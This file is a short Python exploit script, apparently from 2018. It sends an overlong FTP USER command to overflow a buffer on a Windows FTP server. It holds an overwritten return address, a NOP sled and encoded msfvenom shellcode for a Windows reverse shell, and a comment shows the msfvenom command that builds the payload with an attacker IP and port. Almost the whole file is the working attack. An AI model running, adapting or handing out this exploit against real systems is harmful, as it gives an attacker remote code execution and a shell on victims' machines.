#!/usr/bin/env python
# by anakein
# 2018/12/27

import socket as so
import sys
import struct
import time

try:
    server = str(sys.argv[1])
    port   = int(sys.argv[2])

except IndexError:
    print("Usage: python %s 10.0.1.105 21" % sys.argv[0])
    sys.exit()

#\x00\x0a\x0d
#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.103 LPORT=6464 -b "\x00\x0a\x0d" -f python -e x86/shikata_ga_nai EXECFUNC=thread 
#351 bytes

crash = 500
offset = 230

buf = '\x41'*offset
buf += struct.pack("<L", 0x7cb32d69)
buf += '\x90'*15
buf += "\xbd\xb8\x95\x4c\x30\xda\xdc\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x0e\x03\xd0\x9b\xae"
buf += "\xc5\xdc\x4c\xac\x26\x1c\x8d\xd1\xaf\xf9\xbc\xd1\xd4"
buf += "\x8a\xef\xe1\x9f\xde\x03\x89\xf2\xca\x90\xff\xda\xfd"
buf += "\x11\xb5\x3c\x30\xa1\xe6\x7d\x53\x21\xf5\x51\xb3\x18"
buf += "\x36\xa4\xb2\x5d\x2b\x45\xe6\x36\x27\xf8\x16\x32\x7d"
buf += "\xc1\x9d\x08\x93\x41\x42\xd8\x92\x60\xd5\x52\xcd\xa2"
buf += "\xd4\xb7\x65\xeb\xce\xd4\x40\xa5\x65\x2e\x3e\x34\xaf"
buf += "\x7e\xbf\x9b\x8e\x4e\x32\xe5\xd7\x69\xad\x90\x21\x8a"
buf += "\x50\xa3\xf6\xf0\x8e\x26\xec\x53\x44\x90\xc8\x62\x89"
buf += "\x47\x9b\x69\x66\x03\xc3\x6d\x79\xc0\x78\x89\xf2\xe7"
buf += "\xae\x1b\x40\xcc\x6a\x47\x12\x6d\x2b\x2d\xf5\x92\x2b"
buf += "\x8e\xaa\x36\x20\x23\xbe\x4a\x6b\x2c\x73\x67\x93\xac"
buf += "\x1b\xf0\xe0\x9e\x84\xaa\x6e\x93\x4d\x75\x69\xd4\x67"
buf += "\xc1\xe5\x2b\x88\x32\x2c\xe8\xdc\x62\x46\xd9\x5c\xe9"
buf += "\x96\xe6\x88\xbe\xc6\x48\x63\x7f\xb6\x28\xd3\x17\xdc"
buf += "\xa6\x0c\x07\xdf\x6c\x25\xa2\x1a\xe7\x40\x33\x25\x90"
buf += "\x3c\x31\x25\x47\xfd\xbc\xc3\x1d\xed\xe8\x5c\x8a\x94"
buf += "\xb0\x16\x2b\x58\x6f\x53\x6b\xd2\x9c\xa4\x22\x13\xe8"
buf += "\xb6\xd3\xd3\xa7\xe4\x72\xeb\x1d\x80\x19\x7e\xfa\x50"
buf += "\x57\x63\x55\x07\x30\x55\xac\xcd\xac\xcc\x06\xf3\x2c"
buf += "\x88\x61\xb7\xea\x69\x6f\x36\x7e\xd5\x4b\x28\x46\xd6"
buf += "\xd7\x1c\x16\x81\x81\xca\xd0\x7b\x60\xa4\x8a\xd0\x2a"
buf += "\x20\x4a\x1b\xed\x36\x53\x76\x9b\xd6\xe2\x2f\xda\xe9"
buf += "\xcb\xa7\xea\x92\x31\x58\x14\x49\xf2\x68\x5f\xd3\x53"
buf += "\xe1\x06\x86\xe1\x6c\xb9\x7d\x25\x89\x3a\x77\xd6\x6e"
buf += "\x22\xf2\xd3\x2b\xe4\xef\xa9\x24\x81\x0f\x1d\x44\x80"

buffer = buf

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((server, port))
s.recv(1024)
print("sleep 3")
time.sleep(3)
s.send('USER ' + buffer + '\r\n')


s.close()
